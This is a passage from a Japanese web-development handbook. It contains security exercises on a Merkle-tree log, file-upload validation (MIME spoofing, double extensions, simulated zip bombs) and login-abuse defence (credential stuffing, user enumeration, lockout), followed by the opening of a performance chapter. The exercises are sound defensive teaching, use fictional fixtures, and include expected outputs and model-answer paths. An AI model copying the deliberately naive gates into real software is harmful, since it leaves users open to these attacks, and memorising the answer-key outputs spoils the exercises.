> - Merkle Tree はログの改ざんを検知できるだけで、防止も復旧もしない。root を同じ改ざん可能なストレージに置くと攻撃者が木ごと作り直せるため、本番では root を別系統の追記専用ストアや外部のタイムスタンプ機関へ固定する必要がある
> - この実装は木全体をメモリ上の配列に保持し、root() のたびに全体を再計算する。監査ログ規模 (数百万件) ではメモリと計算時間が線形に増えるため、本番では追記時に増分更新する形へ置き換える
> - consistency proof (過去の root が現在の root の接頭辞であることの証明) を実装していないため、この木では「過去のエントリが削除・並べ替えされていないこと」を第三者へ示せない。CT のような用途では inclusion proof だけでは不十分になる
>
> **導線**
>
> - 開始地点: `code/ch23/merkle-tree.ts`
> - 模範解答: `code/ch23/merkle-tree.solution.ts`
>
> **推定時間の内訳**: 葉ハッシュと root 畳み込みの実装35分、proof 生成の兄弟インデックス計算40分、verify とプレフィックスなし版での second preimage 実験40分、葉数1から8までの網羅確認35分
<!-- handbook:exercise:end -->

**要件**:

```typescript
const tree = new MerkleTree();
tree.append('log-entry-1');
tree.append('log-entry-2');
// ...
const root = tree.root();  // 全エントリのハッシュ

// 個別エントリの inclusion proof を生成
const proof = tree.proof(42);
// 第三者がエントリ #42 が root に含まれることを検証可能
const verified = MerkleTree.verify('log-entry-42', proof, root);
```

模範解答: `code/ch23/merkle-tree.solution.ts`

---

#### 課題23.9: アップロードファイルの受け入れ判定を破って塞ぐ (★★★)

**目的**: 23.26 で挙げた MIME 偽装、多重拡張子、圧縮爆弾、配信時のヘッダ不足を、実際に受理・配信させて再現し、判定を差し替えると同じ検体が1件も通らなくなることを確かめる。

<!-- handbook:exercise:start {"id":"23.9"} -->
> **演習カード 課題23.9** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.26 アップロードされたファイルの検証 を読み、申告された種別を信用しない理由と展開比の上限を確認する
> - 12.13 ファイルアップロードの転送方式 を読み、保存キーをサーバで生成する理由を押さえる
> - 23.3 XSS (Cross-Site Scripting) を読み、配信されたファイルがスクリプトとして実行される経路を確認する
> - `code/ch23` で pnpm install 済みで、`pnpm --filter @handbook/ch23 run typecheck` が通る状態にする
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] `sniffType` がマジックバイトから種別を判定し、判定できないものに null を返す
> - [ ] `strictGate` が実体の種別と申告の食い違いを拒否し、拡張子をクライアント由来の値から決めない
> - [ ] `expandArchive` が展開しながらサイズと圧縮比を数え、宣言された展開後サイズを使わない
> - [ ] `deliveryHeaders` が検出した種別、Content-Disposition、nosniff、サンドボックスの CSP、CORP を付ける
> - [ ] 正当な PNG が strictGate でも受理され、拒否件数に含まれない
> - [ ] `pnpm --filter @handbook/ch23 exec tsx upload-validation/starter/report.ts` が6行の要約を出力する
>
> **期待出力**
>
> - 1行目に `naive gate: 4/4 weaknesses reproduced` が出る
> - V1 の行が `naive accepted as image/png / strict rejected: declared type mismatch` になる
> - V2 の行が `naive accepted as application/pdf / strict rejected: unsupported type` になる
> - V3 の行が `naive expanded=268435456 / strict expanded=20971520 aborted=compression ratio` になる
> - 最終行が `strict gate: 0/4 weaknesses remaining (benign png still accepted)` になる
>
> **観察項目**
>
> - `SIGNATURES` から PNG の項目を外し、正当な PNG まで unsupported type で落ちること (過剰な拒否) を確認する
> - `strictGate` の申告と実体の一致検査を外し、V1 だけが再現に戻ることを確認する
> - `expandArchive` の中断判定を外し、V3 だけが再現に戻ることを確認する
> - `FIXTURES.limits.maxRatio` を 1000 へ上げ、V3 の中断理由が compression ratio から expanded size limit へ変わることを確認する
> - `deliveryHeaders` から nosniff を外し、V4 が再現に戻ることを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx upload-validation/solution/report.ts` を実行し、6行の要約が出力されることを確認する
> 2. `pnpm --filter @handbook/ch23 run test` を実行し、upload validation のテストが pass することを確認する
> 3. 自分の `upload-validation/starter/report.ts` を実行し、solution と同じ出力になるかで自己採点する
> 4. `pnpm --filter @handbook/ch23 run typecheck` が 0 エラーで終わることを確認する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 判定の入口を1つに絞る。受理の可否、種別、拡張子、配信ヘッダのすべてを同じ Decision から導くと、どこか1か所だけ古い判断が残るという誤りが起きなくなる。
> 2. **構造**: 検体を4種類の形として整理する。実体と申告が食い違うもの、名前だけで判断させようとするもの、展開すると膨らむもの、そして中身は正当だが配信で危険になるものである。最初の3つは受理の段階で、最後の1つは配信の段階で止まる、という違いを判定の構造に反映させる。
> 3. **実装の要点**: `expandArchive` は、宣言値を一切参照しない形にする。読み進めながら累計を数え、累計と圧縮後サイズの比が上限を超えた時点で中断する。入れ子の深さとエントリ数の上限も同じループの外側で数え、どれか1つが超えたら中断する。
>
> **本番利用時の警告**
>
> - この課題の検体はすべて無害なバイト列であり、実際のマルウェアやエクスプロイトを含まない。実検体を扱う場合は隔離環境と組織の規程に従う。
> - マジックバイトの検査は最低限の関門でしかない。ポリグロットや、形式としては妥当だが解析器を攻撃するファイルは通る。本番では画像の再エンコード、隔離実行、スキャンを併用する。
> - `expandArchive` の模擬は実際の ZIP や gzip の構造を再現していない。本番では利用する展開ライブラリが途中中断と資源上限に対応しているかを個別に確認する。
>
> **導線**
>
> - 開始地点: `code/ch23/upload-validation/starter/main.ts`
> - 模範解答: `code/ch23/upload-validation/solution/main.ts`、`code/ch23/upload-validation/solution/report.ts`
>
> **推定時間の内訳**: sniffType と検体の組み立て35分、naiveGate と strictGate の実装40分、expandArchive の上限判定35分、deliveryHeaders と観察40分
<!-- handbook:exercise:end -->

**題材**: 実在のマルウェアは使わない。`FIXTURES` に含まれるのは、その場で組み立てた無害なバイト列 (正当な PNG、GIF ヘッダで始まる HTML、`.pdf.svg` という名前の SVG、展開比の高い擬似アーカイブ) だけで、いずれもプロセス外へ書き出さない。

**要件**: `code/ch23/upload-validation/starter/main.ts` に次の4つを実装する。

1. `sniffType(head)` ― マジックバイトから種別を判定する。判定できないものは `null` を返す。
2. `naiveGate` / `strictGate` ― 同じ `accept(upload)` 署名を持つ2つの受け入れ判定。`naive` は拡張子と申告 `Content-Type` を信じ、`strict` は実体から種別を決め、申告との食い違いを拒否し、上限と展開比を検査する。
3. `expandArchive(archive, limits, ctx)` ― 展開しながらサイズと比率を数え、上限を超える直前で中断する。ヘッダに書かれた展開後サイズは使わない。
4. `deliveryHeaders(file, mode)` ― 配信時の応答ヘッダを組み立てる。`strict` 側は検出した種別、`Content-Disposition`、`nosniff`、サンドボックスの CSP、CORP を付ける。

再現する4件は次のとおりである。

| 番号 | 検体 | `naive` で起きること |
|---|---|---|
| V1 `magic-mismatch` | `Content-Type: image/png` を申告した GIF ヘッダ + HTML | 画像として受理され、`image/png` で配信される |
| V2 `double-extension` | `logo.pdf.svg` という名前の SVG | 拡張子の先頭一致で PDF とみなされ、`inline` で配信される |
| V3 `zip-bomb` | 圧縮比 512 の擬似アーカイブ | 宣言された展開後サイズを信じ、256MiB まで展開してしまう |
| V4 `sniffable-delivery` | 正当な PNG | `nosniff` も `Content-Disposition` も付かずに配信される |

**評価基準**:

- 同じ `runFindings` が、`naiveGate` では 4/4、`strictGate` では 0/4 になる
- V1 と V2 が、拡張子ではなく実体から判定した結果として拒否される
- V3 が、展開の途中 (宣言値ではなく実測値) で中断される
- V4 が、正当な PNG を受理したうえで、配信ヘッダの不足だけを指摘する
- 正当な PNG が `strictGate` でも受理され、拒否件数に含まれない (過剰な拒否をしていない)

```text
naive gate: 4/4 weaknesses reproduced
  V1 magic-mismatch: naive accepted as image/png / strict rejected: declared type mismatch
  V2 double-extension: naive accepted as application/pdf / strict rejected: unsupported type
  V3 zip-bomb: naive expanded=268435456 / strict expanded=20971520 aborted=compression ratio
  V4 sniffable-delivery: naive missing=[x-content-type-options, content-disposition, content-security-policy, cross-origin-resource-policy] / strict missing=[]
strict gate: 0/4 weaknesses remaining (benign png still accepted)
```

模範解答: `code/ch23/upload-validation/solution/`

#### 課題23.10: 濫用対策の鍵と応答の設計を破って塞ぐ (★★★)

**目的**: 13.25 の試行の鍵と段階的な対応、23.27 の鍵・層・返し方が欠けた状態を実際に再現し、層を重ねた実装へ差し替えると同じ攻撃が1件も通らなくなることを確かめる。

<!-- handbook:exercise:start {"id":"23.10"} -->
> **演習カード 課題23.10** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 13.25 認証エンドポイントの濫用 を読み、4種類の攻撃で効く対策が違うことと、鍵を層として置く理由を確認する
> - 23.27 自動化された脅威 を読み、鍵・層・返し方の3つを決めるという枠組みを押さえる
> - 課題23.5 レート制限を実装する を先に終えて、固定窓とトークンバケットの違いを把握しておく
> - `code/ch23` で pnpm install 済みで、`pnpm --filter @handbook/ch23 run typecheck` が通る状態にする
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] `LayeredGuard.signals` がアカウント・送信元IP・ネットワーク・全体の4層の鍵を返し、鍵を正規化する
> - [ ] `LayeredGuard.login` が2層以上の超過で 429 と Retry-After を返し、その判定が保存領域を引かずに完結する
> - [ ] 1層だけの超過では拒否せず、追加確認へ回す。成否で応答の文言を変えない
> - [ ] 存在しないアカウントでも同じ経路を通り、処理時間の差 (verifiedHash) が残らない
> - [ ] 漏洩資格情報 (BREACHED) に一致するパスワードは、正しくても素通りさせない
> - [ ] `pnpm --filter @handbook/ch23 exec tsx abuse-defense/starter/report.ts` が6行の要約を出力する
>
> **期待出力**
>
> - 1行目に `naive guard: 4/4 weaknesses reproduced` が出る
> - B1 の行の naive が `accepted=2 [chiba@example.test, bito@example.test]` で、layered が `accepted=0 []` になる
> - B2 の行が `naive distinguishable=2/2 / layered distinguishable=0/2` になる
> - B3 の行が `naive victim-blocked=true / layered victim-blocked=false` になる
> - 最終行が `layered guard: 0/4 weaknesses remaining (normal login still succeeds)` になる
>
> **観察項目**
>
> - `signals` をアカウント1層だけにし、B4 が再現に戻る (layered blocked=0/30 status=401 retry-after=none) ことを確認する
> - BREACHED の照合を外し、B1 が再現に戻る (layered accepted=2) ことを確認する
> - 失敗時の応答文言を成否で分け、B2 が再現に戻る (layered distinguishable=1/2) ことを確認する
> - 429 の条件を `exceeded.length >= 1` へ変え、4件は解消したまま拒否件数が 10 から 25 へ増えることを確認する
> - `normalizeEmail` の呼び出しを外し、report の4件は変わらないが章テストの「大文字小文字を変えても同じ鍵として数える」が 401 で失敗することを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx abuse-defense/solution/report.ts` を実行し、6行の要約が出力されることを確認する
> 2. `pnpm --filter @handbook/ch23 run test` を実行し、abuse defence の4件のテストが pass することを確認する
> 3. 自分の `abuse-defense/starter/report.ts` を実行し、solution と同じ出力になるかで自己採点する
> 4. `pnpm --filter @handbook/ch23 run typecheck` が 0 エラーで終わることを確認する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 同じ試行を複数の鍵で同時に数える。1つの鍵しか持たないと、その粒度に合わない攻撃 (1アカウントあたり数回しか試さないもの、送信元を分散させたもの) が必ず素通りする。逆に鍵を厳しくするほど巻き添えが増えるため、層ごとに違う上限を置く。
> 2. **構造**: しきい値を超えたときの選択肢を、拒否の一択にしない。超えた層が1つなら追加確認、2つ以上なら拒否、という段階を作れば、攻撃者の費用は上がるが正規の利用者には回復手段が残る。固定ロックを使うと、攻撃者が他人を締め出せるようになる。
> 3. **実装の要点**: 応答から情報が漏れる経路は、文言だけではない。処理時間、状態コード、レート制限がかかるかどうかのすべてが手掛かりになる。存在しないアカウントでも同じ経路を通し、同じ文言を返し、同じ制限を適用する。
>
> **本番利用時の警告**
>
> - 資格情報も漏洩リストもすべて架空の値であり、実在のものではない。攻撃の模擬はプロセス内で完結する。
> - 自分が所有していない、あるいは許可を得ていないシステムに対して、同種の試行を行ってはならない。不正アクセスにあたりうる。
> - この実装は固定窓の最小構成であり、時間窓の減衰も分散環境でのカウンタ共有も持たない。プロセス内カウンタのままスケールアウトすると、実効上限が台数分だけ緩む (23.27、課題23.5)。
> - しきい値、チャレンジの方式、漏洩資格情報の照合先の選定は、利用者層とアクセシビリティ、そして法務の判断を伴う。本課題は法的助言ではない (13.25、23.27、30.16)。
>
> **導線**
>
> - 開始地点: `code/ch23/abuse-defense/starter/main.ts`
> - 模範解答: `code/ch23/abuse-defense/solution/main.ts`、`code/ch23/abuse-defense/solution/report.ts`
>
> **推定時間の内訳**: NaiveGuard と攻撃の模擬の読解30分、signals の設計30分、login の段階的対応50分、runFindings と観察40分
<!-- handbook:exercise:end -->

**題材**: 課題23.5 はレート制限の**アルゴリズム** (Token Bucket と Sliding Window) を実装した。本課題が扱うのはその周りにある判断であり、アルゴリズムは固定窓の最小実装で足りる。資格情報も漏洩リストもすべて架空の値で、攻撃の模擬はプロセス内で完結する。ネットワークへは一切出ない。

**要件**: `code/ch23/abuse-defense/starter/main.ts` に次の3つを実装する。

1. `LayeredGuard.signals(request)` ― アカウント・送信元IP・ネットワーク・全体の4層の鍵と上限を返す。鍵は正規化する。
2. `LayeredGuard.login(request, trace)` ― 2層以上の超過で `429` と `Retry-After` を返し、1層だけなら追加確認へ回す。存在しないアカウントでも同じ経路・同じ文言・同じ制限にし、漏洩資格情報に一致するパスワードは素通りさせない。
3. `runFindings()` ― 4件について `naive` と `layered` の観測値を集める。

再現する4件は次のとおりである。

| 番号 | 誤り | `naive` で起きること |
|---|---|---|
| B1 `credential-stuffing` | 鍵がアカウント単位だけで、漏洩資格情報を照合しない | 1アカウントにつき1回しか試さない攻撃が素通りし、2件が認証を通る |
| B2 `user-enumeration` | 存在しないアカウントで文言を変え、ハッシュ検証も省く | 応答の文言と処理の有無の2つから、アカウントの存在が判別できる |
| B3 `lockout-dos` | しきい値を超えたら固定時間ロックする | 攻撃者がわざと失敗させることで、正規の利用者を締め出せる |
| B4 `missing-retry-after` | 拒否に `Retry-After` を付けない | クライアントが待つべき時間を知れず、即座にリトライして状況が悪化する |

B3 の判定では、追加確認を求められることを「締め出し」とは数えていない。本人が越えられる関門が残っているかどうかが、固定ロックとの違いである。

**評価基準**:

- 同じ `runFindings` が、`naive` 側では 4/4、`layered` 側では 0/4 になる
- B1 が、鍵の層を増やしたことと漏洩資格情報の照合の両方で止まる
- B2 が、文言と処理経路の両方を揃えたことで判別できなくなる
- B3 で、正規の利用者が別の場所から入る経路が残っている
- 平常時の正しいログインが `layered` 側でも成功する (過剰な拒否をしていない)

```text
naive guard: 4/4 weaknesses reproduced
  B1 credential-stuffing: naive accepted=2 [chiba@example.test, bito@example.test] / layered accepted=0 []
  B2 user-enumeration: naive distinguishable=2/2 / layered distinguishable=0/2
  B3 lockout-dos: naive victim-blocked=true / layered victim-blocked=false
  B4 missing-retry-after: naive blocked=25/30 status=429 retry-after=none / layered blocked=10/30 status=429 retry-after=30
layered guard: 0/4 weaknesses remaining (normal login still succeeds)
```

模範解答: `code/ch23/abuse-defense/solution/`

<!-- handbook:code-usage:start {"chapter":23} -->
### 第23章のコード集の使い方

<!-- handbook:generated; do not edit -->

コード集は pnpm ワークスペースとして構成してある (CODE_TOOLCHAIN.md)。依存はリポジトリ最上位で一度だけ解決し、章ごとの操作は `--filter` でワークスペースを指定する。

```bash
# 初回のみ。リポジトリ最上位で実行する
pnpm install

# 第23章の模範解答をまとめて検証する
pnpm --filter @handbook/ch23 run test

# 模範解答を個別に実行する
pnpm --filter @handbook/ch23 exec tsx sqli/solution/demo.ts               # 課題23.1
pnpm --filter @handbook/ch23 exec tsx xss/solution/main.ts                # 課題23.2
pnpm --filter @handbook/ch23 exec tsx csrf.solution.ts                    # 課題23.3
pnpm --filter @handbook/ch23 exec tsx ssrf-guard.solution.ts              # 課題23.4
pnpm --filter @handbook/ch23 exec tsx rate-limit.solution.ts              # 課題23.5
pnpm --filter @handbook/ch23 exec tsx secure-headers.solution.ts          # 課題23.6
pnpm --filter @handbook/ch23 exec tsx dep-scanner.solution.ts             # 課題23.7
pnpm --filter @handbook/ch23 exec tsx merkle-tree.solution.ts             # 課題23.8
pnpm --filter @handbook/ch23 exec tsx upload-validation/solution/main.ts  # 課題23.9
pnpm --filter @handbook/ch23 exec tsx abuse-defense/solution/main.ts      # 課題23.10
```

開始地点は模範解答と同じ場所に置いてある (`<name>.ts` と `<name>.solution.ts`、またはディレクトリ課題の `starter/` と `solution/`)。課題ごとの完成条件と採点手順は本節の演習カードと `code/ch23/README.md` にある。模範解答の多くは関数を export するだけで、実行して意味のある出力が出るかどうかは課題によって異なる。まず `run test` で通し、個別実行は演習カードのテスト方法に従う。
<!-- handbook:code-usage:end -->


ここまでで、攻撃者が越えようとする境界と、それを多層で守る方法を整理した。しかし、安全であることは、利用者が必要な時間内に機能を使えることを保証しない。第24章では、可用性を待ち時間と負荷条件へ具体化し、利用者の経路を計測して改善する。

---

<a id="chapter-24"></a>
## 第24章 パフォーマンス

第23章で、入力や主体を信頼境界ごとに検証し、機密性・完全性・可用性を守る考え方を得た。しかし、安全な処理でも、画面表示やAPI応答が遅く、負荷上昇で待ち行列が伸びれば、利用者にとっては使えない。セキュリティの可用性を実際の体験へ落とすには、「遅い」という感覚を経路と資源へ分解する必要がある。

本章では、Core Web Vitalsからネットワーク、バックエンド、DB、キャッシュまで、利用者が待つ時間を一つの要求経路として測る。最適化の技法を先に選ぶのではなく、計測、仮説、改善、再計測の順でボトルネックを移動させる。第25章では、得られた性能特性と機能の正しさを、変更のたびに再確認できるテスト戦略へ進む。
<!-- handbook:chapter-guide:start {"chapter":24} -->
> **この章の学習ガイド**
>
> **解決する実務上の問題**  
> 体感の「遅い」を、利用者指標、フロントエンド、ネットワーク、バックエンド、DBへ分解し、測定可能な改善へ変える。
>
> **到達目標**
> - Core Web Vitalsとフィールド/ラボ計測を区別できる。
> - ボトルネックを計測し、最適化対象を選べる。
> - 負荷試験結果を容量とSLOへ接続できる。
>
> 到達目標は章全体に対するものである。標準通読ルートは必修節だけを読むため、下の「中核概念」に (実務選択) (発展) (展望) と付いた節がある章では、その節を読むまで到達目標の一部が埋まらない。必修節を読み終えた時点で説明できない項目があれば、まず付記のある節へ進む。
>
> **前提知識**
> - [8.6 コード分割 (Code Splitting)](03-part2-frontend.md#section-8-6) ― コード分割
> - [14.4 実行計画 (EXPLAIN) の読み方](05-part4-data.md#section-14-4) ― 実行計画
> - [22.7 SLI / SLO / SLA](06-part5-infrastructure.md#section-22-7) ― SLO
>
> **中核概念**  
> [24.1 Core Web Vitals](#section-24-1)、[24.2 フロントエンド最適化](#section-24-2)、[24.3 ネットワーク最適化](#section-24-3)、[24.4 バックエンド最適化](#section-24-4)、[24.7 プロファイリング](#section-24-7)、[24.8 負荷テスト](#section-24-8)
>
> **最小実装**  
> [24.9 実装課題 ― パフォーマンスを測定・改善する](#section-24-9) (実務選択)
>
> **本番実装との差分**
> - 教材負荷試験の数値は特定環境の結果であり、実トラフィック、キャッシュ、外部依存、データ量を含めて再測定する。
>
> **典型的な失敗**
> - 平均値だけを見る。
> - 測定前に最適化する。
> - 負荷生成側が先に飽和する。
>
> **診断・デバッグ方法**
> - waterfall、CPU/heap profile、APM trace、DB計画を同一リクエストでつなぐ。
> - p50/p95/p99とエラー率を負荷段階別に記録する。
>
> **意思決定チェックリスト**
> - 利用者が待つ区間はどこか。
> - 改善目標と回帰予算は。
> - キャッシュで許容できる鮮度は。
>
> **演習と評価基準**  
> 対象: [24.9 実装課題 ― パフォーマンスを測定・改善する](#section-24-9) (実務選択)
> - 改善前後を同一条件で測り、ボトルネックが移動したことも説明できる。
>
> **一次資料・発展資料**
> - Web Vitals documentation
> - Chrome DevTools documentation
> - k6 documentation
> - PostgreSQL EXPLAIN
<!-- handbook:chapter-guide:end -->

<a id="section-24-1"></a>
### 24.1 Core Web Vitals
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"I","term":"INP (Interaction to Next Paint)"} -->
<!-- handbook:index {"group":"L","term":"LCP (Largest Contentful Paint)"} -->
<!-- handbook:index {"group":"L","term":"Lighthouse"} -->

<!-- handbook:narrative-bridge {"section":"24.1"} -->
セキュリティによって要求の正当性を守っても、利用者が待つ時間を測らなければ可用性を体験として評価できない。Core Web Vitalsは、表示、応答、視覚安定性を利用者側の指標へ変換する。

Google が定めたWebパフォーマンスの主要指標 (現在の値):

- **LCP (Largest Contentful Paint)**: 最大のコンテンツ表示まで → 2.5秒以内が良い
- **INP (Interaction to Next Paint)**: 操作への応答時間 → 200ms以内が良い (2024年に FID から置換)
- **CLS (Cumulative Layout Shift)**: 視覚的なズレの累積 → 0.1以下が良い

これらは検索順位にも影響する。Chrome DevTools の Lighthouse で計測可能。

<a id="section-24-2"></a>
### 24.2 フロントエンド最適化
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"A","term":"AVIF"} -->
<!-- handbook:index {"group":"は行","term":"フォント最適化"} -->

<!-- handbook:narrative-bridge {"section":"24.2"} -->
利用者指標で症状を捉えたら、まずブラウザが取得、解析、描画する資源へ分解する。フロントエンド最適化は、送る量とメインスレッド上の仕事を減らし、表示までの経路を短くする。

**バンドルサイズ削減:**

- ツリーシェイキング (第8章)
- コード分割 (`React.lazy`)
- ライブラリ選定 (`lodash` を `lodash-es` に、moment.js を date-fns に)
- 動的 import で必要なときだけ読む

**画像最適化:**

```html
<!-- レスポンシブ画像 -->
<img
  srcset="hero-400.webp 400w, hero-800.webp 800w, hero-1200.webp 1200w"
  sizes="(max-width: 600px) 400px, (max-width: 1200px) 800px, 1200px"
  src="hero-800.webp"
  alt="Hero"
  loading="lazy"
  decoding="async"
  width="800" height="600"
>
```

- **WebP / AVIF**: PNG/JPEG より小さい
- **loading="lazy"**: 画面外の画像は遅延読み込み
- **width/height 指定**: CLS 防止
- **CDNで画像変換**: Cloudflare Images、Cloudinary など

**フォント最適化:**

```css
@font-face {
  font-family: 'Inter';
  src: url('/fonts/inter.woff2') format('woff2');
  font-display: swap;     /* フォント読み込み中もテキスト表示 */
  unicode-range: U+0000-00FF;  /* 必要な文字だけ読み込む (サブセット) */
}
```

**リソースヒント:**

```html
<link rel="preconnect" href="https://api.example.com">  <!-- 接続を先行 -->
<link rel="preload" href="/critical.css" as="style">     <!-- 早期に取得 -->
<link rel="prefetch" href="/next-page.js">                <!-- 次に行く可能性 -->
```

<a id="section-24-3"></a>
### 24.3 ネットワーク最適化
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"C","term":"CDN"} -->

<!-- handbook:narrative-bridge {"section":"24.3"} -->
ブラウザ内の処理を減らしても、資源の転送開始が遅く、往復回数が多ければ待ち時間は残る。ネットワーク最適化では、接続、圧縮、キャッシュ、配信地点を含む転送経路を扱う。

**HTTP圧縮:**

```typescript
import compression from 'compression';
app.use(compression());  // gzip/brotli で送信
```

JSON、HTML、CSS、JavaScript は圧縮で半分以下になる。画像/動画は既に圧縮済みなので効果なし。

**CDN:**

CloudFront、Cloudflare、Fastly などのCDNで静的アセットを配信。ユーザーから近いノードからレスポンス、エッジキャッシュで高速化。

**キャッシュヘッダ戦略:**

```typescript
// 不変なアセット (ハッシュ付きファイル名)
app.use('/static', express.static('public', {
  maxAge: '1y',
  immutable: true,
}));

// 動的なHTML
app.get('/', (req, res) => {
  res.set('Cache-Control', 'no-cache, must-revalidate');
  res.render('index');
});

// 短期キャッシュ可能なAPI
app.get('/api/categories', (req, res) => {
  res.set('Cache-Control', 'public, max-age=300, s-maxage=3600');
  res.json(categories);
});
```

- `immutable`: 変わらないことを保証 → ブラウザは再検証しない
- `max-age`: ブラウザのキャッシュ秒数
- `s-maxage`: CDNなど共有キャッシュの秒数

<a id="section-24-4"></a>
### 24.4 バックエンド最適化
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"N","term":"N+1問題"} -->
<!-- handbook:index {"group":"か行","term":"コネクションプール"} -->

<!-- handbook:narrative-bridge {"section":"24.4"} -->
転送を最適化しても、サーバがCPU、DB、外部APIで待てば応答は返らない。バックエンド最適化では、要求処理を計算、I/O、待ち行列へ分け、ボトルネックの資源を特定する。

**N+1の解消** (第14章で扱った):

```typescript
// 1000人のユーザー、各5件の投稿 = 5001クエリ → 2クエリへ
const users = await db.user.findMany({ include: { posts: true } });
```

**インデックス活用** (第14章):

EXPLAIN ANALYZE でフルスキャンを検出し、適切なインデックスを追加。

**コネクションプール:**

DB接続の確立は、TCPとTLSの往復に加えて認証処理が要るため軽くない。同一リージョンなら数msから十数ms、リージョンを跨げば数十から数百msになる。プールで再利用する。

```typescript
// Prisma の場合、URL でプールサイズ設定
DATABASE_URL="postgresql://user:pass@host/db?connection_limit=20&pool_timeout=10"
```

「**Nアプリインスタンス × Mプール = 総接続数**」が DB の max_connections を超えないように。サーバレス環境では PgBouncer 等のプロキシで束ねる。

**並列実行:**

```typescript
// BAD: 直列 (合計時間 = 各処理の合計)
const user = await db.user.findUnique({ where: { id } });
const posts = await db.post.findMany({ where: { userId: id } });
const orders = await db.order.findMany({ where: { userId: id } });

// GOOD: 並列 (合計時間 = 最も遅い処理)
const [user, posts, orders] = await Promise.all([
  db.user.findUnique({ where: { id } }),
  db.post.findMany({ where: { userId: id } }),
  db.order.findMany({ where: { userId: id } }),
]);
```

<a id="section-24-5"></a>
### 24.5 キャッシュ戦略
<!-- handbook:learning {"level":"required","minutes":10} -->

<!-- handbook:narrative-bridge {"section":"24.5"} -->
処理自体を速くしても、同じ結果を毎回再計算すれば負荷と遅延は繰り返される。キャッシュは計算を再利用する代わりに、鮮度、無効化、容量という新しい整合性問題を引き受ける。

「速くしたい? キャッシュしろ」が定石。レイヤごとに考える。

**1. ブラウザキャッシュ**: HTTPヘッダで制御
**2. CDNキャッシュ**: エッジで保持
**3. アプリケーションキャッシュ**: メモリ内 (LRU など)
**4. 分散キャッシュ**: Redis
**5. DBキャッシュ**: クエリ結果、Materialized View

```typescript
// Redis をキャッシュ層に
async function getUserProfile(userId: string) {
  const cached = await redis.get(`user:${userId}`);
  if (cached) return JSON.parse(cached);

  const user = await db.user.findUnique({ where: { id: userId } });
  await redis.set(`user:${userId}`, JSON.stringify(user), { EX: 300 });
  return user;
}

// 更新時はキャッシュを破棄
async function updateUser(userId: string, data: any) {
  await db.user.update({ where: { id: userId }, data });
  await redis.del(`user:${userId}`);
}
```

**キャッシュ戦略のパターン:**

- **Cache-Aside (Lazy Loading)**: アプリがキャッシュをチェック、なければDBから取得して書く (上の例)
- **Write-Through**: 書き込み時にキャッシュも更新
- **Write-Behind**: キャッシュに書いて非同期でDBに永続化 (高速だがロスト可能性)
- **Read-Through**: キャッシュ自体がDB取得を担当

**キャッシュの落とし穴:**

- **Thundering Herd / Cache Stampede**: キャッシュ失効の瞬間、多数のリクエストが同時にDBへ向かう。キャッシュ文脈ではほぼ同義で使われる。対策は3つ ― 再生成を1本に絞る (single-flight)、期限前に確率的に前倒しで再生成する、期限切れの値を返しつつ裏で更新する (stale-while-revalidate)
- **Stale Data**: キャッシュ更新漏れ。TTL を短くするか、イベント駆動で無効化

<a id="section-24-6"></a>
### 24.6 アルゴリズムとデータ構造
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"24.6"} -->
キャッシュが効かない初回や高カーディナリティの要求では、元の計算量がそのまま現れる。アルゴリズムとデータ構造は、入力規模に対して処理時間とメモリがどう増えるかを設計段階で制約する。

しばしば軽視されるが、設計レベルの非効率は最適化で取り戻せない。

```typescript
// BAD: O(N²) ─ 1万件で約5000万回の比較 (N(N-1)/2)
function findDuplicates(arr: number[]): number[] {
  const dupes = [];
  for (let i = 0; i < arr.length; i++) {
    for (let j = i + 1; j < arr.length; j++) {
      if (arr[i] === arr[j]) dupes.push(arr[i]);
    }
  }
  return dupes;
}

// GOOD: O(N) ─ 1万件で1万回の走査
function findDuplicates(arr: number[]): number[] {
  const seen = new Set<number>();
  const dupes = new Set<number>();
  for (const n of arr) {
    if (seen.has(n)) dupes.add(n);
    seen.add(n);
  }
  return Array.from(dupes);
}
```

データ量が増えるほど差が広がる。計算量を意識する習慣を。

<a id="section-24-7"></a>
### 24.7 プロファイリング
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"は行","term":"プロファイリング"} -->

<!-- handbook:narrative-bridge {"section":"24.7"} -->
計算量の見積もりだけでは、実際の実装で時間を使う関数や割り当て箇所は分からない。プロファイリングは、実行中のサンプルやイベントから推測を測定結果へ変える。

「**推測するな、測れ**」。

**Node.js:**

```bash
# Chrome DevTools で接続
node --inspect server.js

# CPU プロファイル
node --prof server.js
node --prof-process isolate-*.log

# Clinic.js (より高機能)
clinic doctor -- node server.js
clinic flame -- node server.js
```

**Frontend:**

- Chrome DevTools → Performance タブ
- React DevTools の Profiler
- Lighthouse

**APM (Application Performance Monitoring):**

- New Relic、Datadog、Dynatrace、Sentry Performance
- 本番環境で各エンドポイントのレイテンシ分布、遅いトレースを自動収集

<a id="section-24-8"></a>
### 24.8 負荷テスト
<!-- handbook:learning {"level":"required","minutes":5} -->

<!-- handbook:narrative-bridge {"section":"24.8"} -->
単一要求のプロファイルが健全でも、同時実行数が増えるとキュー、プール、ロックが飽和する。負荷テストは、負荷段階ごとの遅延、エラー、資源使用率を測り、容量限界を明らかにする。

リリース前に「捌ける量」を計測する。

> **向ける先を間違えない**: 負荷テストは、対象が本番だと壊れるだけでは済まない。本番の外部APIへ課金が発生し、共有のレート制限枠を使い切って他の利用者を止め、共有DBへテストデータが混ざる。実行前に必ず向き先のホスト名を読み上げて確認し、負荷生成ツールの設定ファイルに本番のURLを書かない。計測は専用の環境で行い、外部依存はスタブへ差し替える。

